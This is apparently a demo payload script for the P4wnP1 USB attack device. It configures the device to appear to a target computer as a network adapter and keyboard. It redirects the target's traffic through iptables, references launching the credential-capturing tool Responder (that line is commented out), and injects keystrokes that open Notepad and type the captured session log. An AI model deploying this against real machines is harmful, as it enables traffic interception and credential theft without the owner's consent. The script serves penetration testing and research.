# P4wnP1 demo payload by MaMe82
# ==========================
# starts Responder on RNDIS / CDC ECM interface
# prints out stats in several payload stages via HID keyboard on target
# prints out some stats to screen of P4wnP1
# automatically brings Responder screen session to front on login
# (the session could be detached by pressin <CTRL>+<A> , <D>)
# Don't forget to change keyboard language to your locale


# =============================
# USB setup
# =============================
# Make sure to change USB_PID if you enable different USB functionality in order
# to force Windows to enumerate the device again
USB_VID="0x1d6b"        # Vendor ID
USB_PID="0x0105"        # Product ID

USE_ECM=true            # if true CDC ECM will be enabled
USE_RNDIS=true          # if true RNDIS will be enabled
USE_HID=true            # if true HID (keyboard) will be enabled
USE_UMS=false           # if true USB Mass Storage will be enabled

# ==========================
# Network and DHCP options
# ==========================

# We choose an IP with a very small subnet (see comments in README.rst)
IF_IP="172.16.0.1" # IP used by P4wnP1
IF_MASK="255.255.255.252" 
IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Range


# =====================
# Keyboard config
# =====================
lang="us" # Keyboard language for outhid and duckhid commands


# This function gets called after the target network interface is working
# (RNDIS, CDC ECM or both have to be enabled)
function onNetworkUp()
{
	echo "Network up"
	echo "Active device $active_interface"
	echo "P4wnP1 IP $IF_IP"
	echo "P4wnP1 netmask $IF_MASK"


     	# redirect all traffic meant to be routed out through the P4wnP1 to localhost (127.0.0.1)
        #       this for example fetches traffic to DNS servers, which aren't overwritten by our DHCP lease
        #       an UDP request to 8.8.4.4:53 from our target would end up here on 127.0.0.1:53, thanks to
        #       the static routes for 0.0.0.0/1 and 128.0.0.0/1
        iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
        iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT

	#start responder in screen
        #screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -f -v -w -F"

	touch /tmp/responder_started


	# print Network is running via Keyboard to host (test ASCII output via HID keyboard)
	# keyboard layout is derived from setup.cfg
	echo "Network is running" | outhid
}

# this function gets called if the target received a DHCP lease
# (DHCP client has to be running on target)
function onTargetGotIP()
{
	echo "DHCP Lease given to target"
	echo "Target IP $target_ip"

        # add route back through target (for ICS)
        route add -net default gw $target_ip

	# add DNS entry for google DNS
	echo nameserver 8.8.8.8 > /etc/resolv.conf

	echo "Target got IP $target_ip via DHCP" | outhid
}

function onBootFinished()
{
	# we should land here even if no RNDIS / CDC ECM is enabled
	# as long as P4wnP1 gets connected to a target host


	# test for duckyscript (start notepad)
	# !!Note: the delays dramatically increase boot time and are only used for HID demo purposes
	cat << EOF | duckhid
DELAY 2000
GUI r
DELAY 500
STRING notepad.exe
ENTER
DELAY 1000
STRING 2 seconds delay before next output (delay test)
ENTER
DELAY 2000
STRING Delay passed by
ENTER
EOF


	# print "Boot finished" via HID keyboard (languag layoute selected in setup.cfg)
	echo "P4wnP1 boot up finished" | outhid

	# Waiting for responder if not started
	while [ ! -f /tmp/responder_started ]; do
		printf "."
		sleep 0.5
	done


	echo "Next the output of command 'cat /tmp/Responder-Session.log' is sent to keyboard" | outhid
	echo "Testing file output via keyboard" | outhid
	cat /tmp/Responder-Session.log | outhid
}

# commands in this function are ran on user login
# the commans are ran by user "pi"
function onLogin()
{
	echo "Waiting for responder to be started before attaching to screen session"
	echo "Press <CTRL> + <C> to abort waiting"
	while [ ! -f /tmp/responder_started ]; do
		printf "."
		sleep 0.5
	done

	# Bring running responder to foreground
	# session could be forced to background <CTRL> + <A>, <D> to get an interactive console
	sudo screen -d -r	
}
